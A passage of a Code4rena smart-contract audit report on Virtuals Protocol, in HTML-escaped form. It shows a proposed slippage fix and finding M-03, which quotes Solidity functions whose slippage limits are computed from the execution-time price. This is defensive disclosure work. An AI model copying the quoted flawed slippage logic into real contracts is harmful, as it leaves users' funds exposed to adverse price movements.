class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure the amountOut is greater than or equal to minAmountOut\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Slippage exceeded\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSimilarly, apply the same logic to the \u003ccode\u003ebuy\u003c/code\u003e function by adding a \u003ccode\u003eminAmountOut\u003c/code\u003e parameter and checking it against the calculated \u003ccode\u003eamountOut\u003c/code\u003e. This will protect users from unexpected losses due to slippage and improve the overall trading experience.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\" style=\"position:relative;\"\u003e\u003ca href=\"#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\" aria-label=\"m 03 slippage protection in agenttaxdcasell and bondingtaxswapforasset is calculated at execution time effectively retrieving the very same price that the trade will be executing at ultimately providing no protection permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-7\"\u003e[M-03] Slippage protection in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e and \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-381\"\u003eJeremias\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-242\"\u003eadam-idarrha\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-290\"\u003eFavourOkerri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-182\"\u003ejoicygiore\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-131\"\u003emaze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-83\"\u003embuba666\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-293\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-433\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-377\"\u003etestnate\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-237\"\u003evasilishte\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L139-L143\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-3\" aria-label=\"finding description 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eAutomated Market Makers define the price of asset based on a pool of two assets. The ratio at which they exchange, is defined by a curve of constant product. Except when liquidity is proportionally increased for both, the expected behaviour is that as one increases, the other decreases.\u003c/p\u003e\n\u003cp\u003eIn a pair of \u003ccode\u003etoken A\u003c/code\u003e and \u003ccode\u003etoken B\u003c/code\u003e, if a user deposits the first token, the amount he would receive of the second token is defined as the amount of the other token (\u003ccode\u003etoken B\u003c/code\u003e) that we have to take away for their product to remain constant. Thus, every time a swap occurs, prices does even if slightly, change.\u003c/p\u003e\n\u003cp\u003eSometimes before a transaction occurs, users could have also called (and executed) a swap before us, adversely affecting the price ratio (and if the liquidity of the pool is low, that might be even more noticeable). This is an adverse situation we call slippage. To protect against that, some protocols take a minimum amount out.\u003c/p\u003e\n\u003cp\u003eHowever, this protection only makes sense (as the risk it protects against) from outside the transaction in which it occurs. Because once the transaction is executing, unless we work with reentrant tokens or something akin to that, the price we are going to work with is the same one that is being used to calculate slippage protection.\u003c/p\u003e\n\u003cp\u003eCalculating a percentage of acceptable loss from a price fetched at the time of execution then is of no use, since that is already the price that we will be exposed to, be it acceptable or not.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eBondingTax\u003c/code\u003e, the \u003ccode\u003eBondingTax::SwapForAsset\u003c/code\u003e function looks like this:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"40\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount = IERC20(taxToken).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amount \u0026gt; 0, \u0026quot;Nothing to be swapped\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (amount \u0026lt; minSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (amount \u0026gt; maxSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            amount = maxSwapThreshold;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address[] memory path = new address[](2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        path[0] = taxToken;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        path[1] = assetToken;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit this gets whatever the price already is at execution\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amountsOut.length \u0026gt; 1, \u0026quot;Failed to fetch token price\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 expectedOutput = amountsOut[1]; //@audit no protection\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        try router.swapExactTokensForTokens(amount, minOutput, path, treasury, block.timestamp + 300) returns (\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256[] memory amounts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            emit SwapExecuted(amount, amounts[1]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (true, amounts[1]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        } catch {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            emit SwapFailed(amount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere we see that the output is calculated from the price the function fetches at execution time:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit calculated from current price\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(amountsOut.length \u0026gt; 1, \u0026quot;Failed to fetch token price\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 expectedOutput = amountsOut[1]; //@audit expected output is calculated from amountsOut\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis protection is insufficient. A similar implementation is tried in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function dcaSell(uint256[] memory agentIds, uint256 slippage, uint256 maxOverride) public onlyRole(EXECUTOR_ROLE) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(slippage \u0026lt;= DENOM, \u0026quot;Invalid slippage\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 agentId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint i = 0; i \u0026lt; agentIds.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            agentId = agentIds[i];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            TaxAmounts memory agentAmounts = agentTaxAmounts[agentId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 amountToSwap = agentAmounts.amountCollected - agentAmounts.amountSwapped;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (amountToSwap \u0026gt; maxOverride) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                amountToSwap = maxOverride; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            uint256 minOutput = ((amountToSwap * (DENOM - slippage)) / DENOM);  //@audit slippage is received as a ratio here\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            _swapForAsset(agentId, minOutput, maxOverride);  //@audit a ratio over the price at execution\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn both cases, the slippage protection is calculated at run-time. And that’s not a good enough protection against strong price or market movements occurring immediately before our call to uniswap is performed.\u003c/p\u003e\n\u003ch3 id=\"impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe risk at which the protocol is exposed thus, is that price movements could lead to swap being executed at not acceptable prices brought by market dynamics, with no protection. The protocol might lose part of the funds that are meant to go to their treasure in the swap, or creators of \u003ccode\u003esentient\u003c/code\u003e categorized agents might lose part of their trading fees earned.\nGiven that for now there is no public transaction pool in BASE, the severity might be deserving of medium.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" 